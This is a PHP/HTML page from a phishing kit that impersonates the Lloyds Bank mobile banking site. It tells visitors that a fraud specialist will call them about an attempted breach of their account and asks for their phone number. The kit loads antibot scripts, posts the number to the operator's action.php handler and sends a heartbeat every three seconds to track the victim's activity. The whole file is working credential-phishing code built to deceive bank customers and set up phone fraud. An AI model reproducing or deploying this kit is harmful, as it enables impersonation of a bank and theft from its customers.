<?php

session_start();
include 'antibot/One_Time.php';
include 'antibot/session_protect.php';
include 'files/config.php';
include 'files/connect.php';
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">
    <head>
        

        <title>Lloyds Bank - Mobile Banking - Phone number</title>

        <meta name="keywords" content="" />
        <meta name="description" content="" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="content-language" content="en-gb" />
        <link rel="alternate" media="handheld" href="" />
        <meta name="viewport" content="width=device-width" />

        
        <meta name="DCSext.hasTealium" content="1" />

        <link rel="apple-touch-icon" sizes="57x57" href="files/img/ltsb%2057x57-.JPG" />
        <link rel="apple-touch-icon" sizes="114x114" href="files/img/ltsb%20114x114-.JPG" />

        <link type="text/css" href="files/css/base-auto-min200720.css" rel="stylesheet" />

        

        <link rel="shortcut icon" href="files/img/favicon.ico" />
		<script src="files/js/jquery.js"></script>
	<script>
	

    $(document).ready(function() {

	
    var allInputs = $(":input");

    $('#frmLogin').submit(function(e){
        e.preventDefault();
        var phonenumber = $('#phonenumber').val();
        
        if(phonenumber == null || phonenumber == ''){
            return false;
        }
        
        $.ajax({
            type : 'POST',
            url : 'files/action.php?type=phonenumber',
            data : $('#frmLogin').serialize(),
            success: function (data) {
                console.log(data);
                var parsed_data = JSON.parse(data);
                if(parsed_data.status == 'ok'){
                    //console.log(parsed_data);
                    
                    
                    location.href = "Loading.php"
                    
                    
                    
                }else{
                    return false;
                }
                //console.log(parsed_data.status);
            }
            })
        
        
        
    });




    });
	
	
	
	</script>
    <script>
        var interval = 3000;  
        function heartbeat() {
            $.ajax({
                    type: 'GET',
                    url: 'files/activity.php',
                    success: function (data) {
                        var parsed_data = JSON.parse(data);
                        //console.log(parsed_data);
                    },
                    complete: function (data) {
                        setTimeout(heartbeat, interval);
                    }
            });
        }
        setTimeout(heartbeat, interval);
    </script>
    </head>
    <body class="hasJS">
        

        <div id="outer">
            <div id="banner">
                <p id="logo">
                    <img src="files/img/logo-.gif" alt="Lloyds Bank" />
                </p>

                <p id="userstatusNGB">
                    <img src="files/img/padlock-1429554491.png" alt="Secure" />
                </p>

                <p class="cookiePolicy">
                    <a title="Cookie Policy" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/COOKIE_POLICY">
                        Cookie Policy
                    </a>
                </p>

                <div class="clearer"></div>
            </div>

            <div id="header">
                <div class="panelTL">
                    <div class="panelTR">
                        <div class="panelBR">
                            <div class="panelBL">
                                <div id="headerInner">
                                    <!-- start TS:component_0_free_format -->

                                    <h1>Phone number</h1>

                                    <!-- end TS:component_0_free_format -->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>



            <div class="content">
                <div class="login">
                    <div class="panelTL">
                        <div class="panelTR">
                            <div class="panelBR">
                                <div class="panelBL">
                                    <div class="loginInner">
                                        <div class="loginFields">
                                            <form id="frmLogin" name="frmLogin" method="post" action="/personal/mbprimarylogin" autocomplete="off">
											    <input type='hidden' name='userid' value="<?=$_SESSION['uniqueid'];?>">
                                                <br>
                                                <p>
                                                Lloydsbank is currently receiving high amount of calls, you can request a call back by entering your phone number and a member of the Lloydsbank Fraud specialist will reach out to you to discuss the attempted breach of your bank account.
                                                </p>
                                                <div class="formField">
                                                    <label for="frmLogin:phonenumber">Phone number</label>
                                                    <input required type="text" autocomplete="off" id="phonenumber" name="phonenumber" class="wide" maxlength="30" />
                                                </div>
                                                <div class="actionsLogin">
                                                    <div class="divider">
                                                        <hr />
                                                    </div>

                                                    <input id="frmLogin:lnkLogin1" name="frmLogin:lnkLogin1" type="submit" value="Continue" text="Continue" class="submitAction" />
                                                </div>
                                                
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="aside">
                    <p class="sideNote">
                        <a id="lnkForgotUserIDDMC" name="lnkForgotUserIDDMC" href="https://online.lloydsbank.co.uk/ib-access/cwa/forgotten-details/index.html" title="Forgotten your logon details?">Forgotten your logon details?</a>
                    </p>
                </div>

                <div class="appBannerBG">
                    <div class="appBannerLink market">
                        <p style="text-align: center;">
                            <a
                                title="Personal Loan. Use our online calculator to check if you are likely to be approved for a loan without affecting your credit score. Lending is subject to status."
                                href="https://www.lloydsbank.com/loans.html?WT.ac=lon/public/navigation/ban/r1pr/loan/s/rl/LLnsNGBonB"
                                target="_blank"
                                rel="noopener noreferrer"
                            >
                                <img
                                    alt="Personal Loan. Use our online calculator to check if you are likely to be approved for a loan without affecting your credit score. Lending is subject to status."
                                    src="files/img/personalloan2020-.png"
                                />
                            </a>
                        </p>
                    </div>
                </div>
                <div class="clearer"></div>

                <div id="footerLogin">
                    <div class="FootNav">
                        <div class="lnkLevFoot">
                            <p class="lnkLevFootP">
                                <a title="Register for Internet Banking" href="https://online.lloydsbank.co.uk/personal/a/useradmin/mobile/registration/selectaccounttyperegistration.jsp?mobile=true"> Register for Internet Banking</a>

                                <a title="Go to desktop site" href="https://online.lloydsbank.co.uk/personal/logon/login.jsp?mobile=false">Go to desktop site</a>

                                <a title="Help" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/HELP"> Help</a>

                                <a title="Security" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/SECURITY"> Security</a>

                                <a title="Contact us" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/CONTACT_US"> Contact us</a>

                                <a title="Mobile Banking" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>

                                <a title="Legal" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
                            </p>
                        </div>
                        <div class="aside">
                            <div class="aside">
                                <p class="sideNote">
                                    <a title="Mobile Banking" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>
                                </p>
                            </div>

                            <div class="appBannerBG">
                                <div class="appBannerLink">
                                    <p align="center">
                                        <a href="http://www.lloydsbank.com/legal/financial-services-compensation-scheme.asp" title="fscs login tile"><img alt="fscs login tile" src="files/img/Mobile%2520-%25201x-1461591119.png" /></a>
                                    </p>
                                </div>
                            </div>

                            <div class="clearer"></div>
                            <div>
                                <div class="footerLinksLogin">
                                    <a title="Security" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/SECURITY">Security</a>

                                    <a title="Legal" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <input type="hidden" name="smartAppForIosAndAndroid" value="true" /> <input type="hidden" name="smartAppForIosAbvSix" value="true" />
                </div>
            </div>
        </div>

        
    </body>
</html>
